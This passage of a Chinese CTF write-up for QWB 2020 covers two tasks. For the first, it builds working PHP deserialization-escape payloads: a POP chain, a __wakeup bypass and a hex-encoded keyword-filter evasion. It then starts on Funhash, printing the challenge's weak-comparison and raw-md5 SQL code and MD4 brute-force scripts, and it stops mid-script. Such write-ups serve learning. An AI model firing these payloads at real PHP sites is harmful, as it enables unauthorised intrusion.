</code></pre></td></tr></table></div></div><p>访问<code>?a=\0*\0&b=123</code>，如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/01b32705052e3bfa7ef367992de20e466f38232d029d9176273fe8331001da59.png data-thumbnail=/images/强网杯2020部分WriteUp/01b32705052e3bfa7ef367992de20e466f38232d029d9176273fe8331001da59.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/01b32705052e3bfa7ef367992de20e466f38232d029d9176273fe8331001da59.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/01b32705052e3bfa7ef367992de20e466f38232d029d9176273fe8331001da59.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/01b32705052e3bfa7ef367992de20e466f38232d029d9176273fe8331001da59.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/01b32705052e3bfa7ef367992de20e466f38232d029d9176273fe8331001da59.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/01b32705052e3bfa7ef367992de20e466f38232d029d9176273fe8331001da59.png></a><figcaption class=image-caption></figcaption></figure></p><p>在序列化时，<code>user</code>参数的值为<code>\0*\0</code>，长度为5，而经过<code>write()</code>方法后，<code>user</code>参数的值和长度未发生任何变化，因为值中不包含<code>0x00*0x00</code>，所以不会进行替换。</p><p>而在经过<code>read()</code>后，因为<code>user</code>参数的值中包含<code>\0*\0</code>，于是值被替换成了<code>0x00*0x00</code>，但长度并没有改变，依然还是5，PHP 会以 5 的长度来读取字符串，但实际上<code>0x00*0x00</code>的长度只有 3，于是 PHP 继续向后读取，把<code>";</code>也当成了字符串的一部分，然后继续反序列化，因为<code>"</code>被当成了字符串，后面没有<code>"</code>了，导致闭合失败，最终反序列化失败。</p><p>通过这种方式，就可以像之前的例子一样，靠长度不一致的问题，把反序列化中原本的对象信息给当成字符串，而自己再构造相应的数据，来达到修改对象中其他成员变量的值。</p><p><br></p><p>最后总结下上面的分析：</p><ul><li>获取<code>flag</code>，需要通过<code>POP链</code></li><li>在<code>play.php</code>文件中，反序列化<code>player</code>类对象时存在反序列化逃逸，利用这点可以构造<code>POP链</code>的类信息</li><li>受控制的参数为<code>player</code>类对象的<code>user</code>和<code>pass</code>，利用<code>username</code>参数把<code>user</code>成员填充为<code>\0*\0</code>的形式，用来反序列化逃逸，利用<code>password</code>的参数把<code>pass</code>成员构造成<code>POP链</code>类对象，用来获取<code>flag</code></li></ul><p><br></p><p>一步一步来，先把上面的<code>POP链</code>的反序列化信息生成出来，如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>O:6:<span class=s2>&#34;player&#34;</span>:3:<span class=o>{</span>s:7:<span class=s2>&#34;0x00*0x00user&#34;</span><span class=p>;</span>s:3:<span class=s2>&#34;aaa&#34;</span><span class=p>;</span>s:7:<span class=s2>&#34;0x00*0x00pass&#34;</span><span class=p>;</span>O:7:<span class=s2>&#34;topsolo&#34;</span>:1:<span class=o>{</span>s:7:<span class=s2>&#34;0x00*0x00name&#34;</span><span class=p>;</span>O:7:<span class=s2>&#34;midsolo&#34;</span>:1:<span class=o>{</span>s:7:<span class=s2>&#34;0x00*0x00name&#34;</span><span class=p>;</span>O:6:<span class=s2>&#34;jungle&#34;</span>:1:<span class=o>{</span>s:7:<span class=s2>&#34;0x00*0x00name&#34;</span><span class=p>;</span>s:7:<span class=s2>&#34;Lee Sin&#34;</span><span class=p>;</span><span class=o>}}}</span>s:8:<span class=s2>&#34;0x00*0x00admin&#34;</span><span class=p>;</span>i:0<span class=p>;</span><span class=o>}</span>
</code></pre></td></tr></table></div></div><p>由于只需要给<code>pass</code>变量赋值，所以需要截取一段：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1fa06aca2b736825ce05c39a29daf02caa7c92efdaa9481d74a4cf14b3b61c51.png title=image-20200824012335908 data-thumbnail=/images/强网杯2020部分WriteUp/1fa06aca2b736825ce05c39a29daf02caa7c92efdaa9481d74a4cf14b3b61c51.png data-sub-html="<h2> </h2><p>image-20200824012335908</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1fa06aca2b736825ce05c39a29daf02caa7c92efdaa9481d74a4cf14b3b61c51.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1fa06aca2b736825ce05c39a29daf02caa7c92efdaa9481d74a4cf14b3b61c51.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1fa06aca2b736825ce05c39a29daf02caa7c92efdaa9481d74a4cf14b3b61c51.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/1fa06aca2b736825ce05c39a29daf02caa7c92efdaa9481d74a4cf14b3b61c51.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/1fa06aca2b736825ce05c39a29daf02caa7c92efdaa9481d74a4cf14b3b61c51.png></a><figcaption class=image-caption></figcaption></figure></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell><span class=s2>&#34;;s:7:&#34;</span>0x00*0x00pass<span class=s2>&#34;;O:7:&#34;</span>topsolo<span class=s2>&#34;:1:{s:7:&#34;</span>0x00*0x00name<span class=s2>&#34;;O:7:&#34;</span>midsolo<span class=s2>&#34;:1:{s:7:&#34;</span>0x00*0x00name<span class=s2>&#34;;O:6:&#34;</span>jungle<span class=s2>&#34;:1:{s:7:&#34;</span>0x00*0x00name<span class=s2>&#34;;s:7:&#34;</span>Lee Sin<span class=s2>&#34;;}}}s:8:&#34;</span>0x00*0x00admin<span class=s2>&#34;;i:0;}
</span></code></pre></td></tr></table></div></div><p>然后计算需要逃逸的字符长度，这里拿上面的图举例：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5b0e807e68ff84ee00191e79d9e463df37252653301e8ae58072ad1b19021a62.png title=image-20200824013220924 data-thumbnail=/images/强网杯2020部分WriteUp/5b0e807e68ff84ee00191e79d9e463df37252653301e8ae58072ad1b19021a62.png data-sub-html="<h2> </h2><p>image-20200824013220924</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5b0e807e68ff84ee00191e79d9e463df37252653301e8ae58072ad1b19021a62.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5b0e807e68ff84ee00191e79d9e463df37252653301e8ae58072ad1b19021a62.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5b0e807e68ff84ee00191e79d9e463df37252653301e8ae58072ad1b19021a62.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5b0e807e68ff84ee00191e79d9e463df37252653301e8ae58072ad1b19021a62.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/5b0e807e68ff84ee00191e79d9e463df37252653301e8ae58072ad1b19021a62.png></a><figcaption class=image-caption></figcaption></figure></p><p>在这副图中，我们能控制的是这两个框中的内容，而我们的目标是控制<code>pass</code>成员变成<code>POP链</code>，如何控制呢？就需要进行逃逸，让<code>user</code>把后面原本的<code>pass</code>信息给<strong>吃掉</strong>，也就是将其作为<code>user</code>的变量，这样我们构造的<code>pass</code>信息就可以进行闭合，从而就能完全控制<code>pass</code>的值了。所以这两个框之间的内容<code>";s:7:"0x00*0x00pass";s:3:"</code>，就是需要逃逸的内容。</p><p><code>";s:7:"0x00*0x00pass";s:3:"</code>，一共占用 21 个字符长度（<code>0x00</code>占一个字符长度），需要注意的是，这段字符串最后的<code>s:3</code>，指的是传递给<code>pass</code>的长度，也就是上面的<code>POP链的长度</code> 145，所以需要逃逸的字符串实际为<code>";s:7:"0x00*0x00pass";s:145:"</code>，占用23个字符长度。</p><p>根据上面的结论，<code>read()</code>转换一个<code>\0*\0</code>，就会多出两个字符的长度，23个字符就需要 12对<code>\0*\0</code>，12对<code>\0*\0</code>会多出 24个字符的长度，所以<code>POP链</code>得多加一个字符：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>A<span class=s2>&#34;;s:7:&#34;</span>0x00*0x00pass<span class=s2>&#34;;O:7:&#34;</span>topsolo<span class=s2>&#34;:1:{s:7:&#34;</span>0x00*0x00name<span class=s2>&#34;;O:7:&#34;</span>midsolo<span class=s2>&#34;:1:{s:7:&#34;</span>0x00*0x00name<span class=s2>&#34;;O:6:&#34;</span>jungle<span class=s2>&#34;:1:{s:7:&#34;</span>0x00*0x00name<span class=s2>&#34;;s:7:&#34;</span>Lee Sin<span class=s2>&#34;;}}}s:8:&#34;</span>0x00*0x00admin<span class=s2>&#34;;i:0;}
</span></code></pre></td></tr></table></div></div><p>所以<code>Payload</code>就变成了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>?username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=A&#34;;s:7:&#34;%00*%00pass&#34;;O:7:&#34;topsolo&#34;:1:{s:7:&#34;%00*%00name&#34;;O:7:&#34;midsolo&#34;:1:{s:7:&#34;%00*%00name&#34;;O:6:&#34;jungle&#34;:1:{s:7:&#34;%00*%00name&#34;;s:7:&#34;Lee Sin&#34;;}}}s:8:&#34;%00*%00admin&#34;;i:0;}
</code></pre></td></tr></table></div></div><p>先在本机测试一下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/96324ad9b0245e408002f4c67f6c6ba2af2fc9ee62f238276bd3e2af840152a0.png title=image-20200824014746455 data-thumbnail=/images/强网杯2020部分WriteUp/96324ad9b0245e408002f4c67f6c6ba2af2fc9ee62f238276bd3e2af840152a0.png data-sub-html="<h2> </h2><p>image-20200824014746455</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/96324ad9b0245e408002f4c67f6c6ba2af2fc9ee62f238276bd3e2af840152a0.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/96324ad9b0245e408002f4c67f6c6ba2af2fc9ee62f238276bd3e2af840152a0.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/96324ad9b0245e408002f4c67f6c6ba2af2fc9ee62f238276bd3e2af840152a0.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/96324ad9b0245e408002f4c67f6c6ba2af2fc9ee62f238276bd3e2af840152a0.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/96324ad9b0245e408002f4c67f6c6ba2af2fc9ee62f238276bd3e2af840152a0.png></a><figcaption class=image-caption></figcaption></figure></p><p>可以看到已经反序列化成功了，但是并没有执行成功，因为<code>midsolo</code>类中有个<code>__wakeup()</code>，将<code>name</code>变成了字符串了，而不是 <strong>jungle类对象</strong> 了，需要绕过<code>__wakeup()</code>，将<code>midsolo</code>成员属性的个数改成2即可绕过，于是<code>Payload</code>就变成了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>?username<span class=o>=</span><span class=se>\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0</span><span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span>A<span class=s2>&#34;;s:7:&#34;</span>%00*%00pass<span class=s2>&#34;;O:7:&#34;</span>topsolo<span class=s2>&#34;:1:{s:7:&#34;</span>%00*%00name<span class=s2>&#34;;O:7:&#34;</span>midsolo<span class=s2>&#34;:2:{s:7:&#34;</span>%00*%00name<span class=s2>&#34;;O:6:&#34;</span>jungle<span class=s2>&#34;:1:{s:7:&#34;</span>%00*%00name<span class=s2>&#34;;s:7:&#34;</span>Lee Sin<span class=s2>&#34;;}}}s:8:&#34;</span>%00*%00admin<span class=s2>&#34;;i:0;}
</span></code></pre></td></tr></table></div></div><p>再次验证：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/2ba9f9a09960bbb04f8e3aded8f94ebf581bb01fbe0339d818d224fa127b43af.png title=image-20200824015133586 data-thumbnail=/images/强网杯2020部分WriteUp/2ba9f9a09960bbb04f8e3aded8f94ebf581bb01fbe0339d818d224fa127b43af.png data-sub-html="<h2> </h2><p>image-20200824015133586</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/2ba9f9a09960bbb04f8e3aded8f94ebf581bb01fbe0339d818d224fa127b43af.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/2ba9f9a09960bbb04f8e3aded8f94ebf581bb01fbe0339d818d224fa127b43af.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/2ba9f9a09960bbb04f8e3aded8f94ebf581bb01fbe0339d818d224fa127b43af.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/2ba9f9a09960bbb04f8e3aded8f94ebf581bb01fbe0339d818d224fa127b43af.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/2ba9f9a09960bbb04f8e3aded8f94ebf581bb01fbe0339d818d224fa127b43af.png></a><figcaption class=image-caption></figcaption></figure></p><p>注意我在本地把执行的命令改成了<code>ping</code></p><p>执行成功之后尝试去<code>get flag</code>，先访问<code>Payload</code>，然后访问<code>play.php</code>，提示失败：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5ed9ad5713c90f0f38d7436787b168098c7156f7465da380020d4056453be62b.png title=image-20200824015317503 data-thumbnail=/images/强网杯2020部分WriteUp/5ed9ad5713c90f0f38d7436787b168098c7156f7465da380020d4056453be62b.png data-sub-html="<h2> </h2><p>image-20200824015317503</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5ed9ad5713c90f0f38d7436787b168098c7156f7465da380020d4056453be62b.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5ed9ad5713c90f0f38d7436787b168098c7156f7465da380020d4056453be62b.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5ed9ad5713c90f0f38d7436787b168098c7156f7465da380020d4056453be62b.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5ed9ad5713c90f0f38d7436787b168098c7156f7465da380020d4056453be62b.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/5ed9ad5713c90f0f38d7436787b168098c7156f7465da380020d4056453be62b.png></a><figcaption class=image-caption></figcaption></figure></p><p>可以看到这里是在<code>check()</code>被拦了</p><p>再回头看<code>check()</code>，很简单的一个方法，就是判断反序列化数据中是否包含<code>name</code>，包含就退出。而在<code>Payload</code>中，的确是包含<code>name</code>的，因为<code>name</code>是其他类的成员属性，无法避免，所以在这里卡了很久，不知道咋绕过，最后问了下大佬，大佬说用 16进制代替字符串，也就是将<code>name</code>变成 16进制的格式<code>\6e\61\6d\65</code>，并且它的类型不能是小写的<code>s</code>，需改成大写的<code>S</code>，最后<code>Payload</code>就变成了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>?username<span class=o>=</span><span class=se>\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0\0</span>*<span class=se>\0</span><span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span>A<span class=s2>&#34;;s:7:&#34;</span>%00*%00pass<span class=s2>&#34;;O:7:&#34;</span>topsolo<span class=s2>&#34;:1:{S:7:&#34;</span>%00*%00<span class=se>\6</span>e<span class=se>\6</span>1<span class=se>\6</span>d<span class=se>\6</span>5<span class=s2>&#34;;O:7:&#34;</span>midsolo<span class=s2>&#34;:2:{S:7:&#34;</span>%00*%00<span class=se>\6</span>e<span class=se>\6</span>1<span class=se>\6</span>d<span class=se>\6</span>5<span class=s2>&#34;;O:6:&#34;</span>jungle<span class=s2>&#34;:1:{S:7:&#34;</span>%00*%00<span class=se>\6</span>e<span class=se>\6</span>1<span class=se>\6</span>d<span class=se>\6</span>5<span class=s2>&#34;;s:7:&#34;</span>Lee Sin<span class=s2>&#34;;}}}s:8:&#34;</span>%00*%00admin<span class=s2>&#34;;i:0;}
</span></code></pre></td></tr></table></div></div><p>最后访问之后得到<code>flag</code>：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4edf5d931901c9d6b8e9819bf01b09a8dd7a4f4ba6d01913da79d84501e2087.png title=image-20200824020408604 data-thumbnail=/images/强网杯2020部分WriteUp/c4edf5d931901c9d6b8e9819bf01b09a8dd7a4f4ba6d01913da79d84501e2087.png data-sub-html="<h2> </h2><p>image-20200824020408604</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4edf5d931901c9d6b8e9819bf01b09a8dd7a4f4ba6d01913da79d84501e2087.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4edf5d931901c9d6b8e9819bf01b09a8dd7a4f4ba6d01913da79d84501e2087.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4edf5d931901c9d6b8e9819bf01b09a8dd7a4f4ba6d01913da79d84501e2087.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4edf5d931901c9d6b8e9819bf01b09a8dd7a4f4ba6d01913da79d84501e2087.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/c4edf5d931901c9d6b8e9819bf01b09a8dd7a4f4ba6d01913da79d84501e2087.png></a><figcaption class=image-caption></figcaption></figure></p><hr><h2 id=强网先锋funhash>强网先锋——Funhash</h2><p>这道题主要考的是 PHP 中，关于弱类型比较与 md5() 相关的漏洞，如果接触得比较多的话，一下就应该做出来了，下面有两个参考链接，光看这两个链接都能把题做出来。我这里由于是第一次碰到这个题，所以还是记录下过程。</p><p>源码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
<span class=k>include</span> <span class=s1>&#39;conn.php&#39;</span><span class=p>;</span>
<span class=nx>highlight_file</span><span class=p>(</span><span class=s2>&#34;index.php&#34;</span><span class=p>);</span>
<span class=c1>//level 1
</span><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;hash1&#34;</span><span class=p>]</span> <span class=o>!=</span> <span class=nx>hash</span><span class=p>(</span><span class=s2>&#34;md4&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;hash1&#34;</span><span class=p>]))</span>
<span class=p>{</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;level 1 failed&#39;</span><span class=p>);</span>
<span class=p>}</span>

<span class=c1>//level 2
</span><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;hash2&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;hash3&#39;</span><span class=p>]</span> <span class=o>||</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;hash2&#39;</span><span class=p>])</span> <span class=o>!==</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;hash3&#39;</span><span class=p>]))</span>
<span class=p>{</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;level 2 failed&#39;</span><span class=p>);</span>
<span class=p>}</span>

<span class=c1>//level 3
</span><span class=c1></span><span class=nv>$query</span> <span class=o>=</span> <span class=s2>&#34;SELECT * FROM flag WHERE password = &#39;&#34;</span> <span class=o>.</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;hash4&#34;</span><span class=p>],</span><span class=k>true</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;&#39;&#34;</span><span class=p>;</span>
<span class=nv>$result</span> <span class=o>=</span> <span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$query</span><span class=p>);</span>
<span class=nv>$row</span> <span class=o>=</span> <span class=nv>$result</span><span class=o>-&gt;</span><span class=na>fetch_assoc</span><span class=p>();</span> 
<span class=nx>var_dump</span><span class=p>(</span><span class=nv>$row</span><span class=p>);</span>
<span class=nv>$result</span><span class=o>-&gt;</span><span class=na>free</span><span class=p>();</span>
<span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
<span class=cp>?&gt;</span>
</code></pre></td></tr></table></div></div><p>首先来看<code>level 1</code>，需要<code>hash1</code> 与 <code>md4(hash1)</code> 相等，看到这里我第一想法是不可能，这机率太小了，然后还是写了个脚本爆破了一晚上，不出意外没有结果。第二天，网上搜资料的时候，才发现这里用的判断是<code>!=</code>，结合 PHP 的弱类型比较一搜，果然这里有猫腻，经过测试发现，只要满足<code>0e+数字</code>，后面的数字无论怎么变都是相等的，所以只需要构造<code>hash1</code>是<code>0e+数字</code>的格式，并且<code>md4(hash1)</code>的结果也是<code>0e+数字</code>的格式即可。于是再次构造脚本爆破，这里思路正确了，但是脚本构造的有问题，如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>hashlib</span>
<span class=kn>import</span> <span class=nn>string</span>
<span class=kn>import</span> <span class=nn>itertools</span>
<span class=kn>from</span> <span class=nn>Crypto.Hash</span> <span class=kn>import</span> <span class=n>MD4</span>

<span class=n>data</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span>
<span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span>

<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>33</span><span class=p>):</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=n>data</span><span class=p>,</span><span class=n>repeat</span><span class=o>=</span><span class=n>i</span><span class=p>):</span>
        <span class=nb>str</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>((</span><span class=s1>&#39;0e&#39;</span><span class=p>,)</span><span class=o>+</span><span class=n>i</span><span class=p>),</span><span class=s1>&#39;utf8&#39;</span><span class=p>)</span>
        <span class=n>h</span> <span class=o>=</span> <span class=n>MD4</span><span class=o>.</span><span class=n>new</span><span class=p>()</span>
        <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=nb>str</span><span class=p>)</span>
        <span class=n>md4str</span> <span class=o>=</span> <span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
        <span class=k>if</span> <span class=n>md4str</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;0e&#39;</span><span class=p>)</span> <span class=ow>and</span> <span class=n>md4str</span><span class=o>.</span><span class=n>isnumeric</span><span class=p>():</span>
            <span class=k>print</span><span class=p>(</span><span class=s1>&#39;it</span><span class=se>\&#39;</span><span class=s1>s find!&#39;</span><span class=p>)</span>
            <span class=k>print</span><span class=p>(</span><span class=s1>&#39;str:</span><span class=si>%s</span><span class=s1>, md5str:</span><span class=si>%s</span><span class=s1>&#39;</span><span class=o>%</span><span class=p>(</span><span class=nb>str</span><span class=p>,</span> <span class=n>md4str</span><span class=p>))</span>
            <span class=nb>exit</span><span class=p>()</span>
</code></pre></td></tr></table></div></div><p>我这里想的是构造<code> 1 ~ 32</code> 位的字符，依次慢慢增加位数爆破，类似于笛卡尔积的模式，其实这样思路没有问题，最后肯定是能爆破出来的，只是时间有点长，在这里等了几个小时，发现没有结果，以为自己的思路有问题，于是咨询了下大佬，大佬丢了个脚本过来，如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>hashlib</span>
<span class=kn>import</span> <span class=nn>re</span>
<span class=n>prefix</span> <span class=o>=</span> <span class=s1>&#39;0e&#39;</span>
<span class=k>def</span> <span class=nf>breakit</span><span class=p>():</span>
    <span class=n>iters</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
        <span class=n>s</span>  <span class=o>=</span> <span class=p>(</span><span class=n>prefix</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>iters</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
        <span class=n>hashed_s</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;md4&#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
        <span class=n>iters</span> <span class=o>=</span> <span class=n>iters</span> <span class=o>+</span> <span class=mi>1</span>
        <span class=n>r</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>match</span><span class=p>(</span><span class=s1>&#39;^0e[0-9]{30}&#39;</span><span class=p>,</span> <span class=n>hashed_s</span><span class=p>)</span>
        <span class=k>if</span> <span class=n>r</span><span class=p>:</span>
